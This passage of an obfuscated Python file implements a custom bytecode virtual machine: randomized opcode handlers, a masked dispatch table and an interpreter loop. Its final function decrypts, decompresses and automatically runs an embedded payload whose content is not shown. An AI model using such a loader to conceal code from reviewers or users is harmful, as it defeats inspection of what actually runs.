 _b_1_0 = consts[37]; stack.append(_b_0_0); stack.append(_b_1_0)
def _xo994(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left <= right)
def _xu5c6(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left ** right)
def _dr291(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 if frame is None:
  return None
 return (getattr(frame, '_z5a0l725', 0) ^ 90) & 255
def _xh206(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _d0_0 = consts[arg[0]]; _d1_1 = _d0_0; _d1_0 = stack.pop(); _d2_1 = _d1_0
 _d2_0 = _d1_1; _d2_res = _d2_0 == _d2_1; _d3_cond = _d2_res
 if _d3_cond:
  frame._z5a0l725 = arg[1]
def _xidf3(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 val = stack.pop()
 if val:
  frame._z5a0l725 = arg
def _xgbb9(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 pass
def _xw7c3(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _p0b8ic8b = consts[arg]; stack.append(_p0b8ic8b)
def _xgc68(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _b_0_obj = stack.pop(); _b_0_0 = getattr(_b_0_obj, names[2]); _b_1_obj = _b_0_0
 _b_1_0 = getattr(_b_1_obj, names[4]); stack.append(_b_1_0)
def _xq4ce(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left != right)
def _xceaf(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _x60361i2 = stack.pop(); _hgj11yedwb = stack.pop()
 stack.append(_hgj11yedwb + _x60361i2)
def _xd4f7(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left in right)
def _xrd15(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 frame._ixo9t7e8g = fastlocals[arg]; return _RET_SIGNAL
def _xe30d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack.append(getattr(fastlocals[arg[0]], names[arg[1]]))
def _xr42e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 val = stack.pop()
 if not val:
  frame._z5a0l725 = arg
def _xsa38(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _b_0_0 = fastlocals[0]; _b_1_obj = _b_0_0; _b_1_val = stack.pop()
 setattr(_b_1_obj, names[8], _b_1_val)
def _xy1c0(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack.append(stack[-1])
def _xd4fa(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _qm43d8w3zp = names[arg]
 if _qm43d8w3zp in locals_dict:
  del locals_dict[_qm43d8w3zp]
 else:
  raise NameError(f"name '{_qm43d8w3zp}' is not defined")
def _xs9dc(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _b_0_0 = stack.pop(); locals_dict[names[3]] = _b_0_0; _n = names[4]
 _b_1_0 = locals_dict[_n] if _n in locals_dict else globals_dict[_n] if _n in globals_dict else builtins_dict.get(_n) if builtins_dict and _n in builtins_dict else getattr(_builtins, _n)
 stack.append(_b_1_0)
def _xp46d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _n = names[arg[0]]
 _d0_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
 _d1_obj = _d0_0; _d1_0 = getattr(_d1_obj, names[arg[1]]); stack.append(_d1_0)
def _xw9b8(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _gpmnz1udb = stack.pop(); _fbcppvohsm = stack.pop()
 stack.append(_fbcppvohsm % _gpmnz1udb)
def _xifce(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _l2atqyyv = stack.pop(); _udia5u6hc = stack.pop()
 stack.append(_udia5u6hc - _l2atqyyv)
def _xnf5d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 globals_dict[names[arg]] = stack.pop()
def _xic3a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _b_0_0 = fastlocals[1]; _b_1_0 = consts[0]; _b_2_1 = _b_1_0; _b_2_0 = _b_0_0
 _b_2_res = _b_2_0 != _b_2_1; _b_3_0 = _b_2_res; _b_3_res = not _b_3_0
 _b_4_0 = _b_3_res; _b_4_res = not _b_4_0; stack.append(_b_4_res)
def _xy5a1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 seq = list(stack.pop())
 if len(seq) != arg:
  raise ValueError(f'need more than {len(seq)} values to unpack (expected {arg})')
 for item in reversed(seq):
  stack.append(item)
def _xf574(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _ohw06xkxb9 = stack.pop(); _myr6ccvcj = stack.pop()
 stack.append(_myr6ccvcj / _ohw06xkxb9)
def _xu1f1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 attr_idx, argc = arg; name = names[attr_idx]
 args = stack[-argc:] if argc > 0 else []
 if argc > 0:
  del stack[-argc:]
 obj = stack.pop(); func = getattr(obj, name)
 if isinstance(func, _types.MethodType) and isinstance(func.__func__, _uuy41ibljh):
  args = [func.__self__] + list(args); func = func.__func__
 if isinstance(func, _uuy41ibljh):
  _fl = _azytjxepq8(func.code, args, {}, func.defaults, func.kw_defaults)
  frame._sjza7tz0 = _vzycwtiqj(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
 else:
  stack.append(func(*args))
def _xrd75(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _t0_0 = stack.pop()
 while len(fastlocals) <= arg[0]:
  fastlocals.append(None)
 fastlocals[arg[0]] = _t0_0; _t1_0 = fastlocals[arg[1]]; stack.append(_t1_0)
def _xr534(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 keys = stack.pop(); kw_count = len(keys); pos_count = arg - kw_count
 kw_values = stack[-kw_count:] if kw_count > 0 else []
 if kw_count > 0:
  del stack[-kw_count:]
 pos_args = stack[-pos_count:] if pos_count > 0 else []
 if pos_count > 0:
  del stack[-pos_count:]
 func = stack.pop()
 dec_keys = tuple((bytes((x ^ k[0] for x in k[1])).decode('utf-8') if isinstance(k, list) else k for k in keys))
 kwargs = dict(zip(dec_keys, kw_values))
 if isinstance(func, _types.MethodType) and isinstance(func.__func__, _uuy41ibljh):
  pos_args = [func.__self__] + list(pos_args); func = func.__func__
 if isinstance(func, _uuy41ibljh):
  _fl = _azytjxepq8(func.code, pos_args, kwargs, func.defaults, func.kw_defaults)
  frame._sjza7tz0 = _vzycwtiqj(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
 else:
  stack.append(func(*pos_args, **kwargs))
def _xhf0c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _n = names[3]
 _b_0_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
 _b_1_0 = fastlocals[1]; _b_2_0 = consts[1]; stack.append(_b_0_0)
 stack.append(_b_1_0); stack.append(_b_2_0)
def _xgb7c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left * right)
def _xx536(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack[-1], stack[-2] = (stack[-2], stack[-1])
def _xd166(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 d = {}
 if arg > 0:
  pairs = stack[-2 * arg:]; del stack[-2 * arg:]
  for i in range(0, len(pairs), 2):
   d[pairs[i]] = pairs[i + 1]
 stack.append(d)
def _xo10d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 if stack[-1]:
  frame._z5a0l725 = arg
 else:
  stack.pop()
def _doded(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 if frame is None:
  return None
 return (getattr(frame, '_z5a0l725', 0) ^ 90) & 255
def _xn486(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left // right)
def _xdeed(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 if arg == 0:
  stack.append(set())
 else:
  items = set(stack[-arg:]); del stack[-arg:]; stack.append(items)
def _xo712(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack.extend(stack[-2:])
def _xv89a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 while len(fastlocals) <= arg[1]:
  fastlocals.append(None)
 fastlocals[arg[1]] = fastlocals[arg[0]]
def _xr3a4(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 code_obj = stack.pop(); kw_defaults = stack.pop() if arg & 2 else {}
 defaults = stack.pop() if arg & 1 else (); closure = []
 if code_obj.freevars:
  for var in code_obj.freevars:
   if var in frame._vljexq77aw.cellvars:
    closure.append(frame._ia1wj0tp[frame._vljexq77aw.cellvars.index(var)])
   elif var in frame._vljexq77aw.freevars:
    closure.append(frame._ia1wj0tp[len(frame._vljexq77aw.cellvars) + frame._vljexq77aw.freevars.index(var)])
 fn = _uuy41ibljh(code=code_obj, globals_dict=globals_dict, defaults=defaults, kw_defaults=kw_defaults, closure=tuple(closure))
 stack.append(fn)
def _xu91f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _y5len606 = stack.pop(); _m9rr7s20c = stack.pop()
 stack.append(_m9rr7s20c @ _y5len606)
def _xd714(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left & right)
def _xb4aa(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 left = fastlocals[arg[0]]; right = consts[arg[1]]; cmp_arg = arg[2]
 res = False
 if cmp_arg == 0:
  res = left < right
 elif cmp_arg == 1:
  res = left <= right
 elif cmp_arg == 2:
  res = left == right
 elif cmp_arg == 3:
  res = left != right
 elif cmp_arg == 4:
  res = left > right
 elif cmp_arg == 5:
  res = left >= right
 elif cmp_arg == 6:
  res = left in right
 elif cmp_arg == 7:
  res = left not in right
 elif cmp_arg == 8:
  res = left is right
 elif cmp_arg == 9:
  res = left is not right
 elif cmp_arg == 10:
  res = isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
 stack.append(res)
def _xy662(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _xr1yxr2dh = names[arg]
 if _xr1yxr2dh in globals_dict:
  stack.append(globals_dict[_xr1yxr2dh])
 elif _xr1yxr2dh == 'super':
  def _ya07h23c42(*args):
   if not args:
    if hasattr(frame, '_zj2d54i3') and frame._zj2d54i3 and hasattr(frame._zj2d54i3, '__class_owner__') and frame._v7eedtjv:
     return _builtins.super(frame._zj2d54i3.__class_owner__, frame._v7eedtjv[0])
   return _builtins.super(*args)
  stack.append(_ya07h23c42)
 elif builtins_dict and _xr1yxr2dh in builtins_dict:
  stack.append(builtins_dict[_xr1yxr2dh])
 else:
  raise NameError(f"name '{_xr1yxr2dh}' is not defined")
def _xecc8(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _y8xrg2gzr = [stack.pop() for _ in range(arg)][::-1] if arg > 0 else []
 _r8s4c3baew = stack.pop()
 if isinstance(_r8s4c3baew, _types.MethodType) and isinstance(_r8s4c3baew.__func__, _uuy41ibljh):
  _y8xrg2gzr = [_r8s4c3baew.__self__] + list(_y8xrg2gzr)
  _r8s4c3baew = _r8s4c3baew.__func__
 if isinstance(_r8s4c3baew, _uuy41ibljh):
  _cfhqcw76xa = _azytjxepq8(_r8s4c3baew.code, _y8xrg2gzr, {}, _r8s4c3baew.defaults, _r8s4c3baew.kw_defaults)
  frame._sjza7tz0 = _vzycwtiqj(_r8s4c3baew.code, _r8s4c3baew.globals_dict, fastlocals=_cfhqcw76xa, closure=_r8s4c3baew.closure, func=_r8s4c3baew)
 else:
  stack.append(_r8s4c3baew(*_y8xrg2gzr))
_cT_48f1 = {0: {15023: _xgf9c, 13303: _xabe2, 14747: _xrd15, 12607: _xb4aa, 15003: _xl802, 14119: _xy662, 15587: _doded, 15707: _xu5c6, 15391: _xe53c, 14583: _xt7c5, 14423: _xe30d, 15299: _xha6a, 9751: _xn6ab, 13763: _xk572, 9455: _xbec1, 15591: _xdeed, 13123: _xu38f, 16255: _xlf0f, 9295: _xu1f1, 12627: _xk76b, 15123: _xh206, 13759: _xidf3, 14587: _xnf5d, 14235: _xl6af, 12427: _xr483, 14243: _xvb5e, 13911: _xide9, 9519: _xp46d, 12855: _xc1bb, 14871: _doded, 13811: _xe471, 16247: _xk8d1, 9467: _xh214, 12319: _xcabf, 14723: _xgc68, 14895: _xdfc1, 12759: _dbb6f, 13439: _xx566, 16267: _xz5eb, 14727: _xxc09, 14139: _xwb65, 9635: _xp4e3, 12295: _xu3bc, 9767: _xn793, 9675: _xg282, 15235: _xr264, 15599: _dbb6f, 15511: _xid4c, 15043: _xd4f7, 13887: _xlaa8, 12619: _xgf9c, 13575: _xr42e}, 1: {9766: _xoed2, 16114: _xs763, 15362: _xvf28, 12998: _xx9fb, 10038: _dre60, 9474: _xk222, 13502: _xdbd3, 12838: _xgb7c, 9970: _xzec9, 15862: _xt42e, 13690: _xw9b8, 9526: _xq4ce, 13718: _xn486, 14102: _xy5a1, 14786: _xk8d1, 9250: _xcc53, 12338: _xrcaa, 13778: _xz38d, 16122: _xqfb2, 15546: _xxf03, 9654: _xsa38, 14534: _xi971, 9930: _xb771, 9578: _xue58, 13162: _xc728, 16142: _dbb6f, 14238: _xue58, 14150: _xw7c3, 14110: _xd27b, 14974: _xvb65, 15018: _xq839, 13086: _xnf5d, 13050: _xxa5a, 14630: _xt16c, 15490: _xn387, 14962: _xhedd, 10074: _xe7c0, 14162: _xd714, 15506: _xd5b2, 12438: _xo712, 9566: _xr31d, 12798: _xuc02, 13062: _xe927}, 2: {14097: _xecc8, 14393: _xcd2b, 9509: _xibb4, 13197: _xsf05, 13473: _xxf46, 12585: _xbde1, 14749: _xa2ca, 13829: _xm28c, 13825: _xle8f, 12613: _xi20f, 15925: _xe6fb, 13305: _xx2d5, 9929: _xx66d, 13081: _xl482, 9641: _xz891, 9897: _xu293, 12433: _xifce, 12969: _xu857, 13125: _dr291, 14689: _xgfdc, 12913: _xp754, 13021: _xe4f2, 13805: _xy662, 14053: _xv4a5, 16373: _xccb5, 13113: _xy1c0, 13461: _xh492, 14221: _xgbb9, 16273: _xifce, 9889: _xvb74, 9537: _xidf3, 12537: _xv630, 16173: _dbb6f, 14021: _xgc45, 14133: _xceaf, 15461: _xrd03, 13129: _xad24, 9649: _xr42e, 13505: _xr264, 15997: _xm242, 13101: _xd372, 16289: _xs242, 13289: _xl39a, 14385: _xpe0e, 14413: _xv89a, 13893: _xo994, 16053: _doded, 14217: _xic3a, 15609: _xqd30, 9581: _xxff7, 14557: _dbb6f, 13593: _xh915, 13545: _xc47f, 14253: _dbb6f}, 3: {16264: _xh1ed, 15508: _xu671, 13908: _xbcac, 13724: _xoa6d, 13352: _xd166, 16088: _xy395, 9996: _xg40b, 12692: _xw608, 14168: _xi841, 10084: _xo4ff, 15552: _xx536, 15040: _xu857, 9992: _xr82d, 12384: _xh39d, 14032: _xla3c, 15884: _xh492, 15144: _xk156, 12860: _xgc45, 9280: _dre60, 14760: _xj762, 13952: _xuae5, 13532: _dr291, 14372: _xrd40, 14620: _xs7c0, 16076: _xrd75, 9876: _xx1dd, 16156: _xaa95, 12992: _xr534, 14720: _xh915, 13924: _xdfc1, 15608: _xf91f, 13976: _xr5b0, 9704: _xdb8b, 9508: _xceaf, 13164: _xna8a, 16304: _xhf0c, 13220: _xma88, 9684: _xz783, 15740: _xu91f, 13056: _xp274, 13652: _doded, 15500: _xo10d, 13256: _xi9da, 9236: _xh11d, 15232: _xs9dc, 14500: _xr3a4, 15084: _xz38d, 12564: _xyd6a, 13556: _xb17a, 9976: _xd4fa, 10060: _xf574, 13168: _xzbe3, 13224: _xo977}}
_ex8fsv87 = None
def _x81sdw4sh(frame):
 global _ex8fsv87; old_frame = _ex8fsv87; _ex8fsv87 = frame; _irt05uirod = []
 try:
  code = frame._vljexq77aw; instructions = code.instructions
  consts = code.consts; names = code.names; stack = frame._ac56t4uf
  fastlocals = frame._v7eedtjv; globals_dict = frame._schj755n
  locals_dict = frame._f4zw9xa3k
  builtins_dict = globals_dict.get('__builtins__')
  if isinstance(builtins_dict, type(_sys)):
   builtins_dict = builtins_dict.__dict__
  elif hasattr(builtins_dict, '__dict__'):
   builtins_dict = builtins_dict.__dict__
  def _yyzoyn6qic(new_f):
   nonlocal frame, code, instructions, consts, names, stack, fastlocals, globals_dict, locals_dict, builtins_dict
   _irt05uirod.append(frame); frame = new_f; code = frame._vljexq77aw
   instructions = code.instructions; consts = code.consts; names = code.names
   stack = frame._ac56t4uf; fastlocals = frame._v7eedtjv
   globals_dict = frame._schj755n; locals_dict = frame._f4zw9xa3k
   builtins_dict = globals_dict.get('__builtins__')
   if isinstance(builtins_dict, type(_sys)):
    builtins_dict = builtins_dict.__dict__
   elif hasattr(builtins_dict, '__dict__'):
    builtins_dict = builtins_dict.__dict__
   return True
  def _atvazccbls(val):
   nonlocal frame, code, instructions, consts, names, stack, fastlocals, globals_dict, locals_dict, builtins_dict
   if _irt05uirod:
    frame = _irt05uirod.pop(); code = frame._vljexq77aw
    instructions = code.instructions; consts = code.consts; names = code.names
    stack = frame._ac56t4uf; fastlocals = frame._v7eedtjv
    globals_dict = frame._schj755n; locals_dict = frame._f4zw9xa3k
    builtins_dict = globals_dict.get('__builtins__')
    if isinstance(builtins_dict, type(_sys)):
     builtins_dict = builtins_dict.__dict__
    elif hasattr(builtins_dict, '__dict__'):
     builtins_dict = builtins_dict.__dict__
    stack.append(val); return True
   return False
  while frame._z5a0l725 in instructions:
   opcode, arg = instructions[frame._z5a0l725]; frame._z5a0l725 += 3
   try:
    sub_tbl = _cT_48f1.get(opcode % 4)
    if sub_tbl:
     h = sub_tbl.get(opcode ^ 13335)
     if h:
      res = h(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts)
      if res is _RET_SIGNAL:
       if _atvazccbls(frame._ixo9t7e8g):
        continue
       return frame._ixo9t7e8g
    if frame._sjza7tz0 is not None:
     _odxtad1ior = frame._sjza7tz0; frame._sjza7tz0 = None
     _yyzoyn6qic(_odxtad1ior); continue
   except Exception as exc:
    handled = False
    while True:
     while frame._el6246hi:
      b = frame._el6246hi.pop()
      if b.type == _kdd4v30t.WITH:
       del stack[b.stack_height:]; suppress = False
       if b.exit_fn:
        try:
         suppress = bool(b.exit_fn(type(exc), exc, exc.__traceback__))
        except Exception:
         suppress = False
       if suppress:
        frame._z5a0l725 = b.handler_pc; handled = True; break
      elif b.type in (_kdd4v30t.EXCEPT, _kdd4v30t.FINALLY):
       del stack[b.stack_height:]; stack.append(exc)
       frame._z5a0l725 = b.handler_pc; handled = True; break
     if handled:
      break
     if _irt05uirod:
      frame = _irt05uirod.pop(); code = frame._vljexq77aw
      instructions = code.instructions; consts = code.consts; names = code.names
      stack = frame._ac56t4uf; fastlocals = frame._v7eedtjv
      globals_dict = frame._schj755n; locals_dict = frame._f4zw9xa3k
      builtins_dict = globals_dict.get('__builtins__')
      if isinstance(builtins_dict, type(_sys)):
       builtins_dict = builtins_dict.__dict__
      elif hasattr(builtins_dict, '__dict__'):
       builtins_dict = builtins_dict.__dict__
     else:
      break
    if not handled:
     raise
  return None
 finally:
  _ex8fsv87 = old_frame
def _lt2tala7():
 _psn = _ziiuc039t()
 decrypted = _u2pcn9t8(_b64.b85decode(_p2lk2n7h9g()), _rv25ao20())
 raw = _zlib.decompress(decrypted); reader = _uaji0y6d(raw)
 root_code = _hv3a3zmf8(reader); g = globals()
 if '__builtins__' not in g:
  g['__builtins__'] = _builtins
 f = _vzycwtiqj(root_code, g, locals_dict=g)
 if _psn:
  f._jlookep7y6 ^= _psn
 return _x81sdw4sh(f)
_lt2tala7()
